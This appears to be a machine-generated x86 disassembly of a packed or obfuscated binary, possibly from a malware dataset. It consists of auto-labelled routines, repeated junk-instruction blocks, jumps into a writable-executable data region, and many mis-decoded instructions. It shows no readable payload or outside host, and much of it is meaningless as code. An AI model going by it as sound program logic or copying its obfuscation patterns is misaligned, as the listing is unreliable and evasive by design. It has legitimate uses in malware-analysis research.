shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
pushfd
bt bx 0x9
cmc
sub al 0x30
cmp bh bh
cmp dh 0xe0
cmp al 0x9
pushfd
call sub_1011f098
mov [ esp ] eax
push eax
push ebp
not al
push 0x5109f9c1
lodsb [ esi ]
call sub_10118fea
xor dl 0xac
jns rwxdata
idiv dh
inc esi
stc
sbb ah [ 0x47be0679 ]
0xe254
in al 0x1a
pop ebx
std
pushad
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
imul ebp esi
pop ss
test al 0xf7
out dx eax
out dx eax
hlt
sub_101443dc
lea esp [ esp + 0x4 ]
call sub_1014c55d
pushad
push [ esp ]
mov [ esp ] 0x4a
push [ esp ]
lea esp [ esp + 0x28 ]
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
sub_101443f9
cmc
jmp rwxdata
pushfd
test edi edi
jmp rwxdata
jmp rwxdata
push ecx
lea esp [ esp + 0x34 ]
je rwxdata
movsx dx al
je rwxdata
call sub_1014491d
test [ eax ] bh
cmpsb [ esi ] [ edi ]
push 0xcbbac4b6
movsb [ edi ] cs : [ esi ]
pop esp
xor al 0x14
pushfd
add esi [ edi + 0x7 ]
push ebx
dec ebx
imul edx [ ebx - 0x2a479f22 ] 0x30
inc ecx
lodsb [ esi ]
fwait
push ecx
outsb
shl [ ecx ] 0x1
mov ebx 0x76e9cfde
dec esp
jb rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
or edi [ ecx + 0x50a94144 ]
loopne rwxdata
push esi
lea esi [ edx ]
pushad
fbstp [ ebx + ecx * 8 - 0x75 ]
ror edi cl
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
stosb [ edi ]
cwde
xchg ebx ebx
mov [ 0x2211cd1c ] eax
adc al 0x6b
aam 0xdf
fadd [ edx + 0x74 ]
pop ds
dec eax
pop edi
mov [ ebx + 0x3c88b79c ] ah
leave
fiadd [ eax ]
mov ah 0xa8
add [ edx + ebp + 0x65516eb4 ] dl
pop edx
imul edx [ ebx - 0x37 ] 0xffffff96
ja rwxdata
dec esi
xor eax 0x6713cc58
xchg ecx eax
mov [ 0xffffffffe4db88a1 ] al
arpl dx cx
push es
jns rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
jmp 0x3983c645
pop ss
push 0xde80a9f5
and al 0xfb
sbb dh al
cdq
movsd [ edi ] [ esi ]
fcmovb st5
mov ch 0xaa
nop
push esi
enter 0xd3c2 0xcc
imul eax
inc edi
fsubr st1
pop edi
test [ edi ] bl
push ss
xor dh [ eax + 0x690ed055 ]
imul [ eax - 0x17b52b0a ]
push esi
insb
push edx
xchg ecx eax
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
aaa
cwde
push bx
sub ebp [ ebx ]
xor ecx [ eax + 0x57 ]
imul esi [ eax * 2 + 0x5d7e6d11 ] 0x67
outsd
stosd [ edi ]
fwait
test eax 0xf29ec096
lodsb [ esi ]
mov al [ 0xffffffffbe622fc2 ]
popad
jb rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata

rwxdata
push cs
imul esi esi 0x4ad4f6a8
call 0xffffffffa163e6cd
mov [ ebx + edx * 4 - 0x5a61954 ] bl
inc ebp
cmp esi [ edx - 0x5a ]
xor eax 0xd0c1f174
inc edx
xchg ebp eax
aas
sbb cl 0x85
xchg esi eax
pop eax
out 0xc7 eax
out dx eax
or [ ebx - 0x52 ] 0xffffffbd
rol [ ecx ] 0x9e
jecxz rwxdata
dec edi
mov dh 0x88
mov dh 0x8f
0xf81fd708 0x9288
test [ edi ] dh
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10144651
lea esp [ esp + 0xc ]
jne rwxdata
push edi
pushad
call sub_10201207
setg ah
mov [ edi - 0x1 ] 0x0
setpo ah
push ebx
push ecx
bswap eax
movsx eax bl
call sub_1020432a
sub_10144684
sub ebx edi
xor di 0x38a9
shr al 0x4
movsx di dl
btc di 0x2
sub esp 0xfffffffc
add ebx esp
shl al cl
xor di dx
bt edx ebx
mov edi ebx
inc al
sar al 0x7
inc al
not al
mov al 0x2e
cmp dh 0xd5
clc
stc
[ edi ]
call sub_10117483
sub_101446bd
push 0x1f4988bb
push edi
lea esp [ esp + 0x14 ]
je rwxdata
pushfd
inc bl
sub bh al
mov bx [ esi ]
pushfd
cmp si dx
stc
and ebx 0xfff
call j_sub_102057d4
in eax 0x20
[ eax + 0x27 ]
push esp
dec ebx
pop esp
add bh [ edx + 0x1 ]
mov [ 0xffffffff83c45aa5 ] eax
cld
push ss
dec eax
add bl [ esi + edx * 4 + 0x1acd2a8 ]
add al 0xbf
and [ edi + 0x8 ] dl
mov dl [ edx + ecx * 2 + 0x54 ]
mov ax 0xa877
sti
push ecx
pushad
push ebx
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
add esi 0x2
jmp rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_1014491d
pushfd
cmp bl 0x7b
add eax edi
cmp bh 0x10
cmp bl 0x46
cmp eax edx
push esp
lea esp [ esp + 0xc ]
jb rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
pushfd
cmp eax [ ebp - 0x10 ]
push edi
call sub_1020618e
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pop edi
sub esi edx
popad
je rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10144c40
push ebp
pushfd
push ecx
lea esp [ esp + 0xc ]
call sub_101ffc63
jmp rwxdata
call sub_10201415
push ecx
mov ah 0x6b
lahf
pop edi
xor [ edi - 0x138e0760 ] cl
dec eax
add [ ebx + 0xc ] dh
scasb [ edi ]
jo rwxdata
pop es
adc al 0xb5
enter 0xc01e 0xb7
scasd [ edi ]
mov eax 0x9e830ee4
xchg esp ecx
mov dh 0x98
pop edi
pop esi
enter 0xc63 0x54
das
cmpsb [ esi ] [ edi ]
sar [ ebx + 0x144e5b7 ] cl
aaa
inc edi
mov [ 0xffffffff85b3a7b5 ] al
0x606d
sbb bl [ ecx - 0x7b ]
aaa
dec esp
dec ebx
push esp
outsd
jo rwxdata
test al 0x22
cld
push ss
dec eax
xor cl [ esi + esi * 2 + 0x48 ]
xchg ebp eax
or [ edx + 0x2d ] esi
xchg edx eax
or eax 0x30affd22
test edx eax
jl rwxdata
cmp eax 0xb7c01ec8
test esp esi
push ecx
in eax dx
inc ecx
les ecx [ edi + 0x6b03823c ]
xor al 0x9b
stosd [ edi ]
jle rwxdata
mov ch 0x71
pop ebx
in eax dx
pop edi
xor [ ebx ] bl
jecxz rwxdata
fdiv st3
sub al 0x81

inc edi
pop eax
mov es cx
or dh [ esp + edx * 4 - 0x4aebf804 ]
jpo rwxdata
btc ebx ebx
pushfd
mov ebx eax
jmp rwxdata
xor ch dl
jle rwxdata
cmp [ ecx - 0x6b ] cl
scasb [ edi ]
popfd
out dx eax
push 0x37
xchg ecx eax
pushfd
mov edi 0x29ad9c83
push ds
ror [ 0x42f0b25e ] 0x1
push es
sub [ 0x59851302 ] edi
fisubr [ ecx - 0xd ]
add eax 0x44b5921b
0xc7029d85 0x4b73
clc
cmp al 0xaf
cmp [ edi ] 0x23
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
xchg edi eax
add [ ebx ] 0x2f
scasd [ edi ]
cmp al 0x8f

xchg ebx eax
loope rwxdata
push cs
mov dl 0x6c
mov ebx 0x39e45bec
loopne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
sar ax 0xd
bts ax 0x1
sub edx edx
movsx ax bl
daa
sbb ax dx
aas
mov eax edx
dec al
test bl 0xe2
or al cl
add edi 0x1
and al 0x5f
adc al 0xd7
mov al [ edi ]
cmp eax edx
test al al
jmp rwxdata
les edi [ edx - 0x5f50611f ]
mov dl 0x1e
fiadd [ ecx + 0x22ea95aa ]
xchg dl ch
xchg esp eax
jmp 0xffffffff9c0c8ab9
inc [ edi - 0x68 ]
sbb eax esp
mov edx 0xcc1e7f74
jg rwxdata
inc edi
cwde
je rwxdata
retn 0xc391
sti
dec eax
xchg ebp eax
mov edx 0x838ad5a5
jpo rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
stc
jmp rwxdata
clc
stc
sub al 0x30
call sub_1014781a
sub_10144eab
je rwxdata
pushfd
call sub_102055eb
stc
pushfd
add esp ebx
sti
pop edi
aas
add [ esi - 0x1f975431 ] 0xe9
sbb al 0x5b
add al 0xd6
test eax 0xbe806e10
xchg ebp eax
stosb [ edi ]
int 0x92
sub dh dh
in eax 0x3a
sbb al 0x42
pop esp
inc edx
pop esp
inc edx
jge rwxdata
pushad
pushad
jmp rwxdata
pop ebx
jle rwxdata
jo rwxdata
call sub_1020546b
push ebx
mov [ esp ] 0xe5eacaa9
push esi
pushad
pushfd
mov [ esp + 0x4 ] 0x83
mov [ esp + 0x24 ] 0x6efb1c32
pushad
push [ esp + 0xc ]
lea esp [ esp + 0x48 ]
jmp sub_1020d404
cwde
int3
cmpsb [ esi ] [ edi ]
cmp esi ecx
adc edx edi
test eax 0x1f49a115
aad 0x3
inc eax
xchg esp eax
sub ch [ ebx - 0x58 ]
mov bh 0x43
pop ecx
sub ch [ ebx + esi * 4 ]

sub_101454db
cmp dl dh
[ edi ]
pushfd
pushfd
lea esp [ esp + 0x2c ]
jne rwxdata
pushfd
push 0x3e973c26
call j_sub_10144651
pushfd
stc
or ecx ecx
push 0xbe8c8ee5
lea esp [ esp + 0xc ]
je rwxdata
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
pushad
stc
stc
xor eax eax
add esp 0x20
pushad
pushad
or ebx ebx
push 0xf46ea48a
push [ esp + 0x8 ]
lea esp [ esp + 0x48 ]
je rwxdata
pushad
movzx dx dl
lea edx [ ebx + 0x4 ]
not di
lea esi [ esi * 8 - 0x3550b641 ]
pushad
movsx edi cl
movzx esi [ edx + 0x1a ]
call sub_1011658d
push edi
pushad
call sub_10201207
pushfd
lea eax [ ebx * 2 + 0x736ae1eb ]
mov [ edi - 0x1 ] 0x0
pushad
lea eax [ edx * 2 + 0x1a584740 ]
pop eax
not ax
mov [ esp + 0x1c ] ebx
lahf
pushfd
movsx ax dl
lea eax [ rwxdata ]
jmp sub_1011ecd9
pushad
mov bh 0xa6
mov edi [ esp + 0x20 ]
jmp sub_10144c23
movzx si al
mov esi eax
movsx ax al
bswap ax
pushad
mov [ esp + 0x1c ] ebx
push [ esp + 0x4 ]
not ax
pushfd
lea eax [ LocalFree@IAT ]
jmp rwxdata
pushad
call sub_102091f3
les esi [ eax - 0x54c3412 ]
or ebx [ esp + esi * 4 ]
inc eax
xchg ebx eax
int3
sub_10145808
pushfd
mov [ esp ] 0x6d
[ edi ] [ esi ]
call j_sub_102052d9
mov al [ 0xffffffffab5c2c31 ]
adc [ eax + edx * 8 + 0x5dc138b5 ] esi
mov bl 0x2a
sbb dl [ edi - 0x502a1e39 ]
in eax 0xbe
fadd [ esi ]
int1
and [ esi ] esi
lodsd [ esi ]
dec edi
arpl [ edi + 0xf0ce239 ] bp
in al dx
push ecx
pop ss
jge rwxdata
mov al 0x3e
xchg esp eax
sti
xchg edi eax
outsd
cmp [ edi ] ecx
pop esp
add [ edx - 0x6cc32d4c ] dl
fst st5
shl [ ebx + 0x332e3fb3 ] cl
cmpsb [ esi ] [ edi ]
mov esi 0xe1d598f7
cwde
mov [ 0x7b5a3bb1 ] al
and ah cl
sub eax 0xb2203f8
dec esp
daa
xchg ebx eax
jo rwxdata
jns rwxdata
inc edi
je rwxdata
dec esi
jpe rwxdata
xor eax 0xfb54d84e
sbb eax [ eax - 0x66 ]
jge rwxdata
into
shl [ eax + ebp * 2 - 0x14 ] cl
or al 0x26
out 0x10 eax
mov edx 0xf4aba312
jae rwxdata
mov bl 0xb9
lodsd [ esi ]
neg ecx
inc edi
cmp [ ecx + 0x2ee67447 ] edx
int 0x98
ror [ edi - 0x4aa4c352 ] cl
mov ebp 0xaf634fad
cmp edx esp
or al 0xf
xor edi esi
int 0x98
sbb [ edi + 0x4c ] 0x16
xor dl cl
dec ebp
inc ecx
insb
mov es [ ebp - 0x2d31606e ]
je rwxdata
sbb ah [ eax + 0x1a3b3ffd ]
or eax 0xa9de8afd
sub [ esi - 0x51702cbc ] 0xbdb55b3c
cwde
mov cl 0x8f
sub_10145c02
cmc
bt ax cx
imul edx edx 0xa
cmc
add edx eax
pushfd
mov [ esp ] 0x7117
pushfd
mov [ esp ] bl
lea esp [ esp + 0x10 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_10145e96
lea esp [ esp + 0x10 ]
ja rwxdata
clc
pushfd
clc
call sub_102010f5
rcl edi 0xe7
nop
iretd
clc
add al dh
sub ebx edi
ror edi 0x10
push 0x9675c29c
btr edi 0x1f
add di bx
sub esp 0xfffffffc
add ebx esp
and di cx
mov edi ebx
cmp ch ch
mov al 0x2e
cmc
cmc
cmp bl 0x99
bt ax 0x1
[ edi ]
pushfd
jmp rwxdata
push 0x93d39f4a
mov [ esp + 0x4 ] dl
lea esp [ esp + 0x8 ]
jne rwxdata
push edi
pushad
call sub_10201207
not al
mov [ edi - 0x1 ] 0x0
pushfd
pushfd
lahf
mov [ esp + 0x4 ] ebx
call sub_102020a3
pop ss
int 0x51
mov al [ 0xffffffffa6653965 ]
nop
out dx eax
mov ch 0xfa
sbb [ ebp + 0x70e33bab ] 0x37ffc0cf
inc edi
jmp eax
sub_10145fa9
mov eax [ esp + 0x3c ]
call sub_10148370
rwxdata
ja rwxdata
movsd [ edi ] [ esi ]
jle rwxdata
jne rwxdata
cld
push es
sbb [ esi - 0x2dbb45b0 ] ch
mov [ ebp + 0x2394b91c ] ds
rol [ ebx - 0x1947f944 ] 0x99
pop ecx
in eax 0xdf
xchg ebx eax
push 0x82d544ec
push [ esp ]
push [ esp + 0xc ]
retn 0x10
enter 0x48d5 0x67
and [ eax ] ch
lodsb [ esi ]
adc esi [ ebx + ecx * 2 ]
mov esp 0x7e5f7f23
and cl dl
xor al 0xba
test [ edx + 0x6e9cc294 ] cl
nop
and edi [ edi + esi * 8 - 0x29372818 ]
test eax 0x10bcc3ea
imul [ edi ]
push [ edi + ecx * 8 + 0x126ddae4 ]
and esi [ ebp + 0x41 ]
dec esp
adc cl [ ecx + 0x36 ]
and [ edi - 0x5263fc53 ] 0xffffffe7
xlat
jmp rwxdata
dec ebx
cmp [ esi + eax + 0x5999e6b8 ] 0xffffffe5
fbld [ esi ]
xchg ebx eax
sub_101463c8
lea esp [ esp + 0x48 ]
jne rwxdata
pushfd
call sub_102055eb
stc
pushfd
add esp ebx
sti
pop edi
aas
add [ esi - 0x1f975431 ] 0xe9
sbb al 0x5b
add al 0xd6
test eax 0xbe806e10
xchg ebp eax
stosb [ edi ]
int 0x92
sub dh dh
in eax 0x3a
sbb al 0x42
pop esp
inc edx
pop esp
inc edx
jge rwxdata
pushad
inc esi
mov [ esp ] cl
mov [ esp ] 0xbb
pushfd
pushad
inc edi
mov [ esp + 0x14 ] ah
mov [ esp ] 0xa4aad93
lea esp [ esp + 0x44 ]
jmp sub_1011ec0a
pop ebx
jle rwxdata
jo rwxdata
cwde
int3
cmpsb [ esi ] [ edi ]
cmp esi ecx
adc edx edi
test eax 0x1f49a115
aad 0x3
inc eax
xchg esp eax
sub ch [ ebx - 0x58 ]
mov bh 0x43
pop ecx
sub ch [ ebx + esi * 4 ]

sub_101466a1
movzx ecx [ edi + ecx * 2 ]
sar di cl
movzx di bl
movsx di al
mov edi [ edx + 0x1c ]
cmc
add edi eax
clc
mov edi [ edi + ecx * 4 ]
push 0x40dd4d97
jmp rwxdata
cmc
test edi edi
push 0x2d57a3
pushad
jmp rwxdata
pushfd
lea esp [ esp + 0x38 ]
je rwxdata
movsx dx al
je rwxdata
push esi
pushfd
cmp al al
stc
add eax edi
mov [ esp + 0x4 ] 0xf0ab6347
pushfd
mov [ esp ] 0xc5
push edi
lea esp [ esp + 0x10 ]
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bt dx 0x9
cmp eax edx
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
cmp bl 0x56
push ebx
call sub_1011eb7e
add [ eax ] al
push edi
push esp
push ebx
inc esi
jb rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
0x89a9f514 0xc6b5
dec ebp
insd
outsd
jb rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
xchg edx eax
jne rwxdata
add [ 0xffffffffe0bf3f9f ] bl
loop rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
inc ebp
mov eax [ 0xffffffffc281fd3d ]
in al dx
lodsd [ esi ]
cmp [ edx - 0x671a661c ] 0xe6
daa
push edi
push 0xc3978c23
fcom [ ebx - 0x64 ]
and ebx ebp
inc [ eax - 0x17aca905 ]
0xfff141 0x5700
in eax dx
pushad
pop ds
mov bl 0xac
add al 0x2e
sbb dh [ ebp + 0x29 ]
imul edx esi 0x42dd0ef0
imul ebx [ edx - 0x3d021988 ] 0x74
or bh [ ecx + 0x752a5426 ]
dec edx
pop eax
xchg [ edi ] bh
jg rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
popad
fst [ edx ]
xor [ eax ] edx
xlat
mov ebx 0x9d1e0d71
in eax dx
xor eax 0x4c06c5b9
popad
and bl [ ebp - 0x6ac61a67 ]
mov esp 0x7b275797
jge rwxdata
inc [ eax + 0x7f ]
and [ ecx ] dh
iretd
push 0xf409a536
pop edx
les eax [ 0x7b9c93d5 ]
or [ ebx ] ch
sbb ah [ esi - 0x9207809 ]
enter 0x53d9 0x2b
cmp edi 0xffffffdf
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
std
cmp [ ecx + 0x9 ] al
jle rwxdata
sbb si bp
int1
sbb eax 0x5915f001
cmc
test eax 0xbd81b1ad
or eax 0xa145da11
cmp eax 0xf2c281fd
in al dx
mov bh 0x88
mov eax [ 0xcfbc48c ]
in al dx
jmp rwxdata
call 0xffffffffab376d8d
mov [ ebx - 0x57 ] edx
insd
push ecx
lea esp [ ecx - 0x23 ]
out dx al
jns rwxdata
jecxz rwxdata
xor [ eax ] ebx
daa
jpo rwxdata
sbb ebp edi
shr [ ecx ] cl
aad 0x16
dec esi
mov dl 0x2a
mov ah 0xf5
or dh [ ecx ]
dec esi
cmpsb [ esi ] [ edi ]
pop edi
dec ebp
xchg edx eax

mov esp es
sti
or al 0xec
salc
sub eax [ edx - 0x12158581 ]
push es
push esp
cmp ecx [ ecx - 0x79 ]
push eax

sub_1014681d
lea esp [ esp + 0xc ]
call sub_101ffc63
jpe rwxdata
pushfd
lea esp [ esp + 0x4 ]
jb rwxdata
jb rwxdata
jmp sub_10144c40
pushad
pushfd
push [ esp + 0x24 ]
retn 0x28
pushad
push [ esp + 0x20 ]
retn 0x24
sub_101468d0
lea esp [ esp + 0x10 ]
ja rwxdata
push edi
pushad
call sub_10201207
bt eax ebp
bt ecx 0x18
imul edx edx 0xa
cmp eax eax
bt si sp
stc
add edx eax
pushad
lea esp [ esp + 0x20 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_101469a8
lea esp [ esp + 0xc ]
ja rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_101ffc63
push eax
lea esp [ esp + 0x4 ]
jae rwxdata
call sub_101ffc63
jmp rwxdata
jbe rwxdata
clc
bt di 0x3
xor eax eax
jmp rwxdata
call sub_1014b145
xchg ebp eax
and al 0x9b
fadd [ ebx + 0x7806fd0 ]
shr [ ebx + 0x68 ] cl
loopne rwxdata
jmp rwxdata
push edx
push 0x8179adcb
lea esp [ esp + 0x8 ]
call sub_10147230
call sub_10147215
pushfd
call sub_1011dfe5
push 0x24df4653
pushfd
lea esp [ esp + 0x8 ]
call sub_101ffc63
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
push edx
int1
pop ds
rcr [ eax ] 0xc
rcl eax cl
xchg ecx eax
mov edx 0x74de6cc8
retn
jmp [ esi ]
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
push esp
call sub_1011e5a4
jl rwxdata
not al
pushfd
jmp rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
sbb dl bl
mov eax 0xca55b202
mov edx 0x8510cf90
or ebp edx
jmp sub_10149924
mov dl 0x60
call sub_10118ad3
lea esp [ esp + 0x28 ]
jbe rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
movsx dx al
je rwxdata
movsx di dl
shr di cl
sub ecx 0x1
shld si di cl
stc
rol edi 0x3
btr si 0xe
mov [ ebp - 0x4 ] ecx
add di cx
xor ch ah
btr cx 0x4
mov ecx [ ebp - 0x8 ]
cmc
add ecx [ ebp - 0x4 ]
bt dx 0x9
sub si cx
shr ecx 0x1
sbb edi ebp
shl si 0x1
bt cx 0xc
mov edi [ ebx + ecx * 4 ]
movsx si dl
sub si sp
btr si 0x6
add edi eax
not si
mov esi [ ebp + 0xc ]
pushfd
jmp j_sub_10208e7c
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
